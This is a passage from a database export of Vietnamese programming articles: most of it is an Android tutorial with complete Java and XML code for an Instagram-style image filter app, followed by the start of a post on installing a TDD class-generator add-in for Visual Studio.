scrolling\n \n    private void setMyScroller() {\n        try {\n            Class<?> viewpager = ViewPager.class;\n            Field scroller = viewpager.getDeclaredField("mScroller");\n            scroller.setAccessible(true);\n            scroller.set(this, new MyScroller(getContext()));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n \n    public class MyScroller extends Scroller {\n        public MyScroller(Context context) {\n            super(context, new DecelerateInterpolator());\n        }\n \n        @Override\n        public void startScroll(int startX, int startY, int dx, int dy, int duration) {\n            super.startScroll(startX, startY, dx, dy, 350 /*1 secs*/);\n        }\n    }\n}\n```\n\nTạo thêm class **SpacesItemDecoration.java** :\n\n```\nimport android.graphics.Rect;\nimport android.support.v7.widget.RecyclerView;\nimport android.view.View;\n \n/**\n * Created by ravi on 23/10/17.\n */\n \npublic class SpacesItemDecoration extends RecyclerView.ItemDecoration {\n    private int space;\n \n    public SpacesItemDecoration(int space) {\n        this.space = space;\n    }\n \n    @Override\n    public void getItemOffsets(Rect outRect, View view, RecyclerView parent, RecyclerView.State state) {\n        if (parent.getChildAdapterPosition(view) == state.getItemCount() - 1) {\n            outRect.left = space;\n            outRect.right = 0;\n        }else{\n            outRect.right = space;\n            outRect.left = 0;\n        }\n    }\n}\n```\n\nXây dựng layout cho item của RecyclerView : **res => layout => thumbnail_list_item.xml** :\n\n```\n<?xml version="1.0" encoding="utf-8"?>\n<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"\n    android:layout_width="wrap_content"\n    android:layout_height="match_parent"\n    android:orientation="vertical">\n \n    <TextView\n        android:id="@+id/filter_name"\n        android:layout_width="wrap_content"\n        android:layout_height="wrap_content"\n        android:layout_gravity="center_horizontal"\n        android:layout_marginBottom="5dp"\n        android:layout_marginTop="5dp"\n        android:fontFamily="@string/roboto_medium" />\n \n    <ImageView\n        android:id="@+id/thumbnail"\n        android:layout_width="@dimen/thumbnail_size"\n        android:layout_height="@dimen/thumbnail_size"\n        android:src="@mipmap/ic_launcher" />\n \n</LinearLayout>\n```\n\n**ThumbnailsAdapter.java** :\n\n```\nimport android.content.Context;\nimport android.support.v4.content.ContextCompat;\nimport android.support.v7.widget.RecyclerView;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.ImageView;\nimport android.widget.TextView;\n \nimport com.zomato.photofilters.imageprocessors.Filter;\nimport com.zomato.photofilters.utils.ThumbnailItem;\n \nimport java.util.List;\n \nimport butterknife.BindView;\nimport butterknife.ButterKnife;\n \n/**\n * Created by ravi on 23/10/17.\n */\n \npublic class ThumbnailsAdapter extends RecyclerView.Adapter<ThumbnailsAdapter.MyViewHolder> {\n \n    private List<ThumbnailItem> thumbnailItemList;\n    private ThumbnailsAdapterListener listener;\n    private Context mContext;\n    private int selectedIndex = 0;\n \n    public class MyViewHolder extends RecyclerView.ViewHolder {\n        @BindView(R.id.thumbnail)\n        ImageView thumbnail;\n \n        @BindView(R.id.filter_name)\n        TextView filterName;\n \n        public MyViewHolder(View view) {\n            super(view);\n \n            ButterKnife.bind(this, view);\n        }\n    }\n \n \n    public ThumbnailsAdapter(Context context, List<ThumbnailItem> thumbnailItemList, ThumbnailsAdapterListener listener) {\n        mContext = context;\n        this.thumbnailItemList = thumbnailItemList;\n        this.listener = listener;\n    }\n \n    @Override\n    public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n        View itemView = LayoutInflater.from(parent.getContext())\n                .inflate(R.layout.thumbnail_list_item, parent, false);\n \n        return new MyViewHolder(itemView);\n    }\n \n    @Override\n    public void onBindViewHolder(MyViewHolder holder, final int position) {\n        final ThumbnailItem thumbnailItem = thumbnailItemList.get(position);\n \n        holder.thumbnail.setImageBitmap(thumbnailItem.image);\n \n        holder.thumbnail.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                listener.onFilterSelected(thumbnailItem.filter);\n                selectedIndex = position;\n                notifyDataSetChanged();\n            }\n        });\n \n        holder.filterName.setText(thumbnailItem.filterName);\n \n        if (selectedIndex == position) {\n            holder.filterName.setTextColor(ContextCompat.getColor(mContext, R.color.filter_label_selected));\n        } else {\n            holder.filterName.setTextColor(ContextCompat.getColor(mContext, R.color.filter_label_normal));\n        }\n    }\n \n    @Override\n    public int getItemCount() {\n        return thumbnailItemList.size();\n    }\n \n    public interface ThumbnailsAdapterListener {\n        void onFilterSelected(Filter filter);\n    }\n}\n```\n\nThêm Image Filters List Fragment như sau :\n+ Tạp fragment mới : **File ⇒ New ⇒ Fragment ⇒ Fragment (Blank) => FiltersListFragment.java. **\n+ Mở layout của fragment **fragment_filters_list.xml ** :\n\n```\n<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"\n    xmlns:tools="http://schemas.android.com/tools"\n    android:layout_width="match_parent"\n    android:layout_height="match_parent"\n    tools:context="info.androidhive.imagefilters.FiltersListFragment">\n \n    <android.support.v7.widget.RecyclerView\n        android:id="@+id/recycler_view"\n        android:layout_gravity="center_vertical"\n        android:layout_width="match_parent"\n        android:layout_height="wrap_content"\n        android:clipChildren="false"\n        android:padding="4dp"\n        android:scrollbars="none" />\n</FrameLayout>\n```\n\n**FiltersListFragment.java** :\n\n```\nimport android.graphics.Bitmap;\nimport android.os.Bundle;\nimport android.support.v4.app.Fragment;\nimport android.support.v7.widget.DefaultItemAnimator;\nimport android.support.v7.widget.LinearLayoutManager;\nimport android.support.v7.widget.RecyclerView;\nimport android.util.Log;\nimport android.util.TypedValue;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\n \nimport com.zomato.photofilters.FilterPack;\nimport com.zomato.photofilters.imageprocessors.Filter;\nimport com.zomato.photofilters.utils.ThumbnailItem;\nimport com.zomato.photofilters.utils.ThumbnailsManager;\n \nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n \nimport butterknife.BindView;\nimport butterknife.ButterKnife;\nimport info.androidhive.imagefilters.utils.BitmapUtils;\nimport info.androidhive.imagefilters.utils.SpacesItemDecoration;\n \n \npublic class FiltersListFragment extends Fragment implements ThumbnailsAdapter.ThumbnailsAdapterListener {\n    @BindView(R.id.recycler_view)\n    RecyclerView recyclerView;\n \n    ThumbnailsAdapter mAdapter;\n \n    List<ThumbnailItem> thumbnailItemList;\n \n    FiltersListFragmentListener listener;\n \n    public void setListener(FiltersListFragmentListener listener) {\n        this.listener = listener;\n    }\n \n    public FiltersListFragment() {\n        // Required empty public constructor\n    }\n \n    @Override\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n    }\n \n    @Override\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        // Inflate the layout for this fragment\n        View view = inflater.inflate(R.layout.fragment_filters_list, container, false);\n \n        ButterKnife.bind(this, view);\n \n        thumbnailItemList = new ArrayList<>();\n        mAdapter = new ThumbnailsAdapter(getActivity(), thumbnailItemList, this);\n \n        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(getActivity(), LinearLayoutManager.HORIZONTAL, false);\n        recyclerView.setLayoutManager(mLayoutManager);\n        recyclerView.setItemAnimator(new DefaultItemAnimator());\n        int space = (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 8,\n                getResources().getDisplayMetrics());\n        recyclerView.addItemDecoration(new SpacesItemDecoration(space));\n        recyclerView.setAdapter(mAdapter);\n \n        prepareThumbnail(null);\n \n        return view;\n    }\n \n    /**\n     * Renders thumbnails in horizontal list\n     * loads default image from Assets if passed param is null\n     *\n     * @param bitmap\n     */\n    public void prepareThumbnail(final Bitmap bitmap) {\n        Runnable r = new Runnable() {\n            public void run() {\n                Bitmap thumbImage;\n \n                if (bitmap == null) {\n                    thumbImage = BitmapUtils.getBitmapFromAssets(getActivity(), MainActivity.IMAGE_NAME, 100, 100);\n                } else {\n                    thumbImage = Bitmap.createScaledBitmap(bitmap, 100, 100, false);\n                }\n \n                if (thumbImage == null)\n                    return;\n \n                ThumbnailsManager.clearThumbs();\n                thumbnailItemList.clear();\n \n                // add normal bitmap first\n                ThumbnailItem thumbnailItem = new ThumbnailItem();\n                thumbnailItem.image = thumbImage;\n                thumbnailItem.filterName = getString(R.string.filter_normal);\n                ThumbnailsManager.addThumb(thumbnailItem);\n \n                List<Filter> filters = FilterPack.getFilterPack(getActivity());\n \n                for (Filter filter : filters) {\n                    ThumbnailItem tI = new ThumbnailItem();\n                    tI.image = thumbImage;\n                    tI.filter = filter;\n                    tI.filterName = filter.getName();\n                    ThumbnailsManager.addThumb(tI);\n                }\n \n                thumbnailItemList.addAll(ThumbnailsManager.processThumbs(getActivity()));\n \n                getActivity().runOnUiThread(new Runnable() {\n                    @Override\n                    public void run() {\n                        mAdapter.notifyDataSetChanged();\n                    }\n                });\n            }\n        };\n \n        new Thread(r).start();\n    }\n \n    @Override\n    public void onFilterSelected(Filter filter) {\n        if (listener != null)\n            listener.onFilterSelected(filter);\n    }\n \n    public interface FiltersListFragmentListener {\n        void onFilterSelected(Filter filter);\n    }\n}\n```\n\nBây giờ chúng ta sẽ thêm fragment cung cấp thao tác chỉnh sửa hình ảnh cơ bản như kiểm soát Độ sáng, Độ bão hòa, Độ tương phản.\nTạo **EditImageFragment.java** và layout của fragment này là **fragment_edit_image.xml** :\n\n**fragment_edit_image.xml**\n\n```\n<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"\n    xmlns:tools="http://schemas.android.com/tools"\n    android:layout_width="match_parent"\n    android:layout_height="match_parent"\n    android:gravity="center_vertical"\n    android:orientation="vertical"\n    android:paddingLeft="@dimen/margin_horizontal"\n    android:paddingRight="@dimen/margin_horizontal"\n    tools:context="info.androidhive.imagefilters.EditImageFragment">\n \n    <LinearLayout\n        android:layout_width="match_parent"\n        android:layout_height="wrap_content"\n        android:orientation="horizontal"\n        android:paddingBottom="@dimen/padding_10"\n        android:paddingTop="@dimen/padding_10">\n \n \n        <TextView\n            android:layout_width="@dimen/lbl_edit_image_control"\n            android:layout_height="wrap_content"\n            android:text="@string/lbl_brightness" />\n \n        <SeekBar\n            android:id="@+id/seekbar_brightness"\n            android:layout_width="0dp"\n            android:layout_height="wrap_content"\n            android:layout_weight="1" />\n    </LinearLayout>\n \n    <LinearLayout\n        android:layout_width="match_parent"\n        android:layout_height="wrap_content"\n        android:orientation="horizontal"\n        android:paddingBottom="@dimen/padding_10"\n        android:paddingTop="@dimen/padding_10">\n \n \n        <TextView\n            android:layout_width="@dimen/lbl_edit_image_control"\n            android:layout_height="wrap_content"\n            android:text="@string/lbl_contrast" />\n \n        <SeekBar\n            android:id="@+id/seekbar_contrast"\n            android:layout_width="0dp"\n            android:layout_height="wrap_content"\n            android:layout_weight="1" />\n    </LinearLayout>\n \n    <LinearLayout\n        android:layout_width="match_parent"\n        android:layout_height="wrap_content"\n        android:orientation="horizontal"\n        android:paddingBottom="@dimen/padding_10"\n        android:paddingTop="@dimen/padding_10">\n \n        <TextView\n            android:layout_width="@dimen/lbl_edit_image_control"\n            android:layout_height="wrap_content"\n            android:text="@string/lbl_saturation" />\n \n        <SeekBar\n            android:id="@+id/seekbar_saturation"\n            android:layout_width="0dp"\n            android:layout_height="wrap_content"\n            android:layout_weight="1" />\n    </LinearLayout>\n \n</LinearLayout>\n```\n\n**EditImageFragment.java **\n\n```\nimport android.os.Bundle;\nimport android.support.v4.app.Fragment;\nimport android.util.Log;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.SeekBar;\n \nimport butterknife.BindView;\nimport butterknife.ButterKnife;\n \n \npublic class EditImageFragment extends Fragment implements SeekBar.OnSeekBarChangeListener {\n \n    private EditImageFragmentListener listener;\n \n    @BindView(R.id.seekbar_brightness)\n    SeekBar seekBarBrightness;\n \n    @BindView(R.id.seekbar_contrast)\n    SeekBar seekBarContrast;\n \n    @BindView(R.id.seekbar_saturation)\n    SeekBar seekBarSaturation;\n \n    public void setListener(EditImageFragmentListener listener) {\n        this.listener = listener;\n    }\n \n    public EditImageFragment() {\n        // Required empty public constructor\n    }\n \n    @Override\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n    }\n \n    @Override\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        View view = inflater.inflate(R.layout.fragment_edit_image, container, false);\n \n        ButterKnife.bind(this, view);\n \n        // keeping brightness value b/w -100 / +100\n        seekBarBrightness.setMax(200);\n        seekBarBrightness.setProgress(100);\n \n        // keeping contrast value b/w 1.0 - 3.0\n        seekBarContrast.setMax(20);\n        seekBarContrast.setProgress(0);\n \n        // keeping saturation value b/w 0.0 - 3.0\n        seekBarSaturation.setMax(30);\n        seekBarSaturation.setProgress(10);\n \n        seekBarBrightness.setOnSeekBarChangeListener(this);\n        seekBarContrast.setOnSeekBarChangeListener(this);\n        seekBarSaturation.setOnSeekBarChangeListener(this);\n \n        return view;\n    }\n \n    @Override\n    public void onProgressChanged(SeekBar seekBar, int progress, boolean b) {\n        if (listener != null) {\n \n            if (seekBar.getId() == R.id.seekbar_brightness) {\n                // brightness values are b/w -100 to +100\n                listener.onBrightnessChanged(progress - 100);\n            }\n \n            if (seekBar.getId() == R.id.seekbar_contrast) {\n                // converting int value to float\n                // contrast values are b/w 1.0f - 3.0f\n                // progress = progress > 10 ? progress : 10;\n                progress += 10;\n                float floatVal = .10f * progress;\n                listener.onContrastChanged(floatVal);\n            }\n \n            if (seekBar.getId() == R.id.seekbar_saturation) {\n                // converting int value to float\n                // saturation values are b/w 0.0f - 3.0f\n                float floatVal = .10f * progress;\n                listener.onSaturationChanged(floatVal);\n            }\n        }\n    }\n \n    @Override\n    public void onStartTrackingTouch(SeekBar seekBar) {\n        if (listener != null)\n            listener.onEditStarted();\n    }\n \n    @Override\n    public void onStopTrackingTouch(SeekBar seekBar) {\n        if (listener != null)\n            listener.onEditCompleted();\n    }\n \n    public void resetControls() {\n        seekBarBrightness.setProgress(100);\n        seekBarContrast.setProgress(0);\n        seekBarSaturation.setProgress(10);\n    }\n \n    public interface EditImageFragmentListener {\n        void onBrightnessChanged(int brightness);\n \n        void onSaturationChanged(float saturation);\n \n        void onContrastChanged(float contrast);\n \n        void onEditStarted();\n \n        void onEditCompleted();\n    }\n}\n```\n\nHãy tạo các layout sau :\n\n**activity_main.xml**\n\n```\n<?xml version="1.0" encoding="utf-8"?>\n<android.support.design.widget.CoordinatorLayout xmlns:android="http://schemas.android.com/apk/res/android"\n    xmlns:app="http://schemas.android.com/apk/res-auto"\n    xmlns:tools="http://schemas.android.com/tools"\n    android:layout_width="match_parent"\n    android:layout_height="match_parent"\n    tools:context="info.androidhive.imagefilters.MainActivity">\n \n    <android.support.design.widget.AppBarLayout\n        android:layout_width="match_parent"\n        android:layout_height="wrap_content"\n        android:theme="@style/AppTheme.AppBarOverlay">\n \n        <android.support.v7.widget.Toolbar\n            android:id="@+id/toolbar"\n            android:layout_width="match_parent"\n            android:layout_height="?attr/actionBarSize"\n            android:background="@android:color/white"\n            app:popupTheme="@style/AppTheme.PopupOverlay" />\n \n    </android.support.design.widget.AppBarLayout>\n \n    <include layout="@layout/content_main" />\n \n</android.support.design.widget.CoordinatorLayout>\n```\n\n**content_main.xml**\n\n```\n<?xml version="1.0" encoding="utf-8"?>\n<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"\n    xmlns:app="http://schemas.android.com/apk/res-auto"\n    xmlns:tools="http://schemas.android.com/tools"\n    android:layout_width="match_parent"\n    android:layout_height="match_parent"\n    android:background="@android:color/white"\n    android:orientation="vertical"\n    app:layout_behavior="@string/appbar_scrolling_view_behavior"\n    tools:context="info.androidhive.imagefilters.MainActivity"\n    tools:showIn="@layout/activity_main">\n \n    <ImageView\n        android:id="@+id/image_preview"\n        android:layout_width="match_parent"\n        android:layout_height="360dp"\n        android:scaleType="centerCrop" />\n \n    <info.androidhive.imagefilters.utils.NonSwipeableViewPager\n        android:id="@+id/viewpager"\n        android:layout_width="match_parent"\n        android:layout_height="120dp"\n        android:layout_above="@+id/tabs"\n        android:layout_below="@+id/image_preview"\n        app:layout_behavior="@string/appbar_scrolling_view_behavior" />\n \n    <android.support.design.widget.TabLayout\n        android:id="@+id/tabs"\n        android:layout_width="match_parent"\n        android:layout_height="wrap_content"\n        android:layout_alignParentBottom="true"\n        app:tabGravity="fill"\n        app:tabMode="fixed" />\n \n</RelativeLayout>\n```\n\nQuay trở lại với **MainActivity.java** :\n\n```\nimport android.Manifest;\nimport android.content.Intent;\nimport android.graphics.Bitmap;\nimport android.net.Uri;\nimport android.os.Bundle;\nimport android.support.design.widget.CoordinatorLayout;\nimport android.support.design.widget.Snackbar;\nimport android.support.design.widget.TabLayout;\nimport android.support.v4.app.Fragment;\nimport android.support.v4.app.FragmentManager;\nimport android.support.v4.app.FragmentPagerAdapter;\nimport android.support.v4.view.ViewPager;\nimport android.support.v7.app.AppCompatActivity;\nimport android.support.v7.widget.Toolbar;\nimport android.text.TextUtils;\nimport android.util.Log;\nimport android.view.Menu;\nimport android.view.MenuItem;\nimport android.view.View;\nimport android.widget.ImageView;\nimport android.widget.Toast;\n \nimport com.karumi.dexter.Dexter;\nimport com.karumi.dexter.MultiplePermissionsReport;\nimport com.karumi.dexter.PermissionToken;\nimport com.karumi.dexter.listener.PermissionRequest;\nimport com.karumi.dexter.listener.multi.MultiplePermissionsListener;\nimport com.zomato.photofilters.imageprocessors.Filter;\nimport com.zomato.photofilters.imageprocessors.subfilters.BrightnessSubFilter;\nimport com.zomato.photofilters.imageprocessors.subfilters.ContrastSubFilter;\nimport com.zomato.photofilters.imageprocessors.subfilters.SaturationSubfilter;\n \nimport java.util.ArrayList;\nimport java.util.List;\n \nimport butterknife.BindView;\nimport butterknife.ButterKnife;\nimport info.androidhive.imagefilters.utils.BitmapUtils;\n \npublic class MainActivity extends AppCompatActivity implements FiltersListFragment.FiltersListFragmentListener, EditImageFragment.EditImageFragmentListener {\n \n    private static final String TAG = MainActivity.class.getSimpleName();\n \n    public static final String IMAGE_NAME = "dog.jpg";\n \n    public static final int SELECT_GALLERY_IMAGE = 101;\n \n    @BindView(R.id.image_preview)\n    ImageView imagePreview;\n \n    @BindView(R.id.tabs)\n    TabLayout tabLayout;\n \n    @BindView(R.id.viewpager)\n    ViewPager viewPager;\n \n    @BindView(R.id.coordinator_layout)\n    CoordinatorLayout coordinatorLayout;\n \n    Bitmap originalImage;\n    // to backup image with filter applied\n    Bitmap filteredImage;\n \n    // the final image after applying\n    // brightness, saturation, contrast\n    Bitmap finalImage;\n \n    FiltersListFragment filtersListFragment;\n    EditImageFragment editImageFragment;\n \n    // modified image values\n    int brightnessFinal = 0;\n    float saturationFinal = 1.0f;\n    float contrastFinal = 1.0f;\n \n    // load native image filters library\n    static {\n        System.loadLibrary("NativeImageProcessor");\n    }\n \n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        ButterKnife.bind(this);\n \n        Toolbar toolbar = findViewById(R.id.toolbar);\n        setSupportActionBar(toolbar);\n        getSupportActionBar().setDisplayHomeAsUpEnabled(true);\n        getSupportActionBar().setTitle(getString(R.string.activity_title_main));\n \n        loadImage();\n \n        setupViewPager(viewPager);\n        tabLayout.setupWithViewPager(viewPager);\n    }\n \n    private void setupViewPager(ViewPager viewPager) {\n        ViewPagerAdapter adapter = new ViewPagerAdapter(getSupportFragmentManager());\n \n        // adding filter list fragment\n        filtersListFragment = new FiltersListFragment();\n        filtersListFragment.setListener(this);\n \n        // adding edit image fragment\n        editImageFragment = new EditImageFragment();\n        editImageFragment.setListener(this);\n \n        adapter.addFragment(filtersListFragment, getString(R.string.tab_filters));\n        adapter.addFragment(editImageFragment, getString(R.string.tab_edit));\n \n        viewPager.setAdapter(adapter);\n    }\n \n    @Override\n    public void onFilterSelected(Filter filter) {\n        // reset image controls\n        resetControls();\n \n        // applying the selected filter\n        filteredImage = originalImage.copy(Bitmap.Config.ARGB_8888, true);\n        // preview filtered image\n        imagePreview.setImageBitmap(filter.processFilter(filteredImage));\n \n        finalImage = filteredImage.copy(Bitmap.Config.ARGB_8888, true);\n    }\n \n    @Override\n    public void onBrightnessChanged(final int brightness) {\n        brightnessFinal = brightness;\n        Filter myFilter = new Filter();\n        myFilter.addSubFilter(new BrightnessSubFilter(brightness));\n        imagePreview.setImageBitmap(myFilter.processFilter(finalImage.copy(Bitmap.Config.ARGB_8888, true)));\n    }\n \n    @Override\n    public void onSaturationChanged(final float saturation) {\n        saturationFinal = saturation;\n        Filter myFilter = new Filter();\n        myFilter.addSubFilter(new SaturationSubfilter(saturation));\n        imagePreview.setImageBitmap(myFilter.processFilter(finalImage.copy(Bitmap.Config.ARGB_8888, true)));\n    }\n \n    @Override\n    public void onContrastChanged(final float contrast) {\n        contrastFinal = contrast;\n        Filter myFilter = new Filter();\n        myFilter.addSubFilter(new ContrastSubFilter(contrast));\n        imagePreview.setImageBitmap(myFilter.processFilter(finalImage.copy(Bitmap.Config.ARGB_8888, true)));\n    }\n \n    @Override\n    public void onEditStarted() {\n \n    }\n \n    @Override\n    public void onEditCompleted() {\n        // once the editing is done i.e seekbar is drag is completed,\n        // apply the values on to filtered image\n        final Bitmap bitmap = filteredImage.copy(Bitmap.Config.ARGB_8888, true);\n \n        Filter myFilter = new Filter();\n        myFilter.addSubFilter(new BrightnessSubFilter(brightnessFinal));\n        myFilter.addSubFilter(new ContrastSubFilter(contrastFinal));\n        myFilter.addSubFilter(new SaturationSubfilter(saturationFinal));\n        finalImage = myFilter.processFilter(bitmap);\n    }\n \n    /**\n     * Resets image edit controls to normal when new filter\n     * is selected\n     */\n    private void resetControls() {\n        if (editImageFragment != null) {\n            editImageFragment.resetControls();\n        }\n        brightnessFinal = 0;\n        saturationFinal = 1.0f;\n        contrastFinal = 1.0f;\n    }\n \n    class ViewPagerAdapter extends FragmentPagerAdapter {\n        private final List<Fragment> mFragmentList = new ArrayList<>();\n        private final List<String> mFragmentTitleList = new ArrayList<>();\n \n        public ViewPagerAdapter(FragmentManager manager) {\n            super(manager);\n        }\n \n        @Override\n        public Fragment getItem(int position) {\n            return mFragmentList.get(position);\n        }\n \n        @Override\n        public int getCount() {\n            return mFragmentList.size();\n        }\n \n        public void addFragment(Fragment fragment, String title) {\n            mFragmentList.add(fragment);\n            mFragmentTitleList.add(title);\n        }\n \n        @Override\n        public CharSequence getPageTitle(int position) {\n            return mFragmentTitleList.get(position);\n        }\n    }\n \n    // load the default image from assets on app launch\n    private void loadImage() {\n        originalImage = BitmapUtils.getBitmapFromAssets(this, IMAGE_NAME, 300, 300);\n        filteredImage = originalImage.copy(Bitmap.Config.ARGB_8888, true);\n        finalImage = originalImage.copy(Bitmap.Config.ARGB_8888, true);\n        imagePreview.setImageBitmap(originalImage);\n    }\n \n    @Override\n    public boolean onCreateOptionsMenu(Menu menu) {\n        getMenuInflater().inflate(R.menu.menu_main, menu);\n        return true;\n    }\n \n    @Override\n    public boolean onOptionsItemSelected(MenuItem item) {\n        int id = item.getItemId();\n \n        if (id == R.id.action_open) {\n            openImageFromGallery();\n            return true;\n        }\n \n        if (id == R.id.action_save) {\n            saveImageToGallery();\n            return true;\n        }\n \n        return super.onOptionsItemSelected(item);\n    }\n \n    @Override\n    protected void onActivityResult(int requestCode, int resultCode, Intent data) {\n        if (resultCode == RESULT_OK && requestCode == SELECT_GALLERY_IMAGE) {\n            Bitmap bitmap = BitmapUtils.getBitmapFromGallery(this, data.getData(), 800, 800);\n \n            // clear bitmap memory\n            originalImage.recycle();\n            finalImage.recycle();\n            finalImage.recycle();\n \n            originalImage = bitmap.copy(Bitmap.Config.ARGB_8888, true);\n            filteredImage = originalImage.copy(Bitmap.Config.ARGB_8888, true);\n            finalImage = originalImage.copy(Bitmap.Config.ARGB_8888, true);\n            imagePreview.setImageBitmap(originalImage);\n            bitmap.recycle();\n \n            // render selected image thumbnails\n            filtersListFragment.prepareThumbnail(originalImage);\n        }\n    }\n \n    private void openImageFromGallery() {\n        Dexter.withActivity(this).withPermissions(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE)\n                .withListener(new MultiplePermissionsListener() {\n                    @Override\n                    public void onPermissionsChecked(MultiplePermissionsReport report) {\n                        if (report.areAllPermissionsGranted()) {\n                            Intent intent = new Intent(Intent.ACTION_PICK);\n                            intent.setType("image/*");\n                            startActivityForResult(intent, SELECT_GALLERY_IMAGE);\n                        } else {\n                            Toast.makeText(getApplicationContext(), "Permissions are not granted!", Toast.LENGTH_SHORT).show();\n                        }\n                    }\n \n                    @Override\n                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {\n                        token.continuePermissionRequest();\n                    }\n                }).check();\n    }\n \n    /*\n    * saves image to camera gallery\n    * */\n    private void saveImageToGallery() {\n        Dexter.withActivity(this).withPermissions(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE)\n                .withListener(new MultiplePermissionsListener() {\n                    @Override\n                    public void onPermissionsChecked(MultiplePermissionsReport report) {\n                        if (report.areAllPermissionsGranted()) {\n                            final String path = BitmapUtils.insertImage(getContentResolver(), finalImage, System.currentTimeMillis() + "_profile.jpg", null);\n                            if (!TextUtils.isEmpty(path)) {\n                                Snackbar snackbar = Snackbar\n                                        .make(coordinatorLayout, "Image saved to gallery!", Snackbar.LENGTH_LONG)\n                                        .setAction("OPEN", new View.OnClickListener() {\n                                            @Override\n                                            public void onClick(View view) {\n                                                openImage(path);\n                                            }\n                                        });\n \n                                snackbar.show();\n                            } else {\n                                Snackbar snackbar = Snackbar\n                                        .make(coordinatorLayout, "Unable to save image!", Snackbar.LENGTH_LONG);\n \n                                snackbar.show();\n                            }\n                        } else {\n                            Toast.makeText(getApplicationContext(), "Permissions are not granted!", Toast.LENGTH_SHORT).show();\n                        }\n                    }\n \n                    @Override\n                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {\n                        token.continuePermissionRequest();\n                    }\n                }).check();\n \n    }\n \n    // opening image in default image viewer app\n    private void openImage(String path) {\n        Intent intent = new Intent();\n        intent.setAction(Intent.ACTION_VIEW);\n        intent.setDataAndType(Uri.parse(path), "image/*");\n        startActivity(intent);\n    }\n}\n```\n\nChạy ứng dụng và kiểm tra một lần. Bạn sẽ thấy giao diện đẹp như trong bài viết. Bạn có thể áp dụng các bộ lọc khác nhau từ danh sách và có thể kiểm soát độ sáng, độ bão hòa và độ tương phản.\n\n![](https://images.viblo.asia/3bb5602b-d20a-474a-8371-142792ff2be5.jpg)	Ngày nay các bộ lọc hình ảnh khá phổ biến trong nhiều ứng dụng Android. Instagram nổi tiếng với tính năng bộ lọc phổ biến và có lẽ là ứng dụng đầu tiên giới thiệu bộ lọc hình ảnh cho thế giới Android.\nCó rất nhiều ứng dụng chỉnh sửa hình ảnh khác cung cấp các bộ lọc hình ảnh và các tính năng chỉnh sửa hình ảnh.\n\nTrong bài viết này, chúng ta sẽ tìm hiểu cách xây dựng một ứng dụng bộ lọc hình ảnh...	{https://images.viblo.asia/a7208cad-de81-41d9-9420-3bc0c448a67b.png,https://images.viblo.asia/3bb5602b-d20a-474a-8371-142792ff2be5.jpg}	1	Android : Xây dựng bộ lọc hình ảnh như app Instagram	{android-library,android}	0	f	2022-12-18 15:33:38.121+00	2022-12-18 15:33:38.121+00
31316	Trong mẹo này, tôi thảo luận về TDD Class Generator Add-In của Eric Hexter cho Visual Studio. Add-In này cho phép bạn tạo một lớp, interface và lớp kiểm tra bằng cách nhập một phím tắt duy nhất.\nEric Hexter - người đã thực hiện công việc có giá trị trong dự án MvcContrib - đã đến thăm Microsoft vào tuần trước và cho tôi xem một trong những dự án hiện tại của anh ấy. Anh ấy đã bắt đầu một dự án xây dựng các Add-Ins cụ thể của ASP.NET MVC cho Visual Studio. Cụ thể, anh ta đã tạo ra một Bổ trợ để tạo các lớp có thể kiểm tra tự động.\n\nBạn có thể tìm hiểu thêm về dự án và tải xuống các tệp và mã nguồn từ trang web sau:\n\nhttp://erichexter.googlecode.com/svn/trunk/TestFirstGenerator/\n\nBạn cũng có thể xem video hướng dẫn Add-In nhanh chóng tại:\n\nhttp://erichexter.googlecode.com/svn/trunk/TestFirstGenerator/docs/ScreenCast.htmlm\n\nTải xuống tệp RecentVersion.zip và giải nén. Sau khi giải nén tệp lưu trữ, hãy đảm bảo rằng bạn nhấn chuột phải vào tệp, chọn Properties và bấm nút Unblock  (xem Hình 1). Nếu bạn quên Unblock kho lưu trữ, thì bạn sẽ gặp phải sự cố bảo mật khi cố gắng sử dụng Add-In.\nFigure 1 – Unblocking the Archive\n\t![alt](https://aspblogs.blob.core.windows.net/media/stephenwalther/WindowsLiveWriter/ASP.NET.NETMVCSpecificVisualStudioAddIns_8D9D/clip_image002_thumb.jpg)\n\nSau khi bạn giải nén Add-In, bạn phải cài đặt Add-In trong Visual Studio. Tải xuống bao gồm tệp Install.cmd để cài đặt Add-In. Thật không may, trình cài đặt không hoạt động trên máy của tôi vì sự cố đường dẫn. Do đó, tôi đã làm theo các bước sau để cài đặt Add-In:\n\n1. Tạo thư mục mới có tên AddIns trong thư mục Documents \\ Visual Studio 2008.\n\n2. Sao chép tất cả các tệp đã giải nén từ tải xuống vào thư mục AddIns mới\n\n3. Sau khi khởi chạy Visual Studio, chọn tùy chọn menuTools, Add-In Manager và bật DD Class Generator Add-In (xem Hình 2).\nHình 2 - Kích hoạt TDD Class Generator 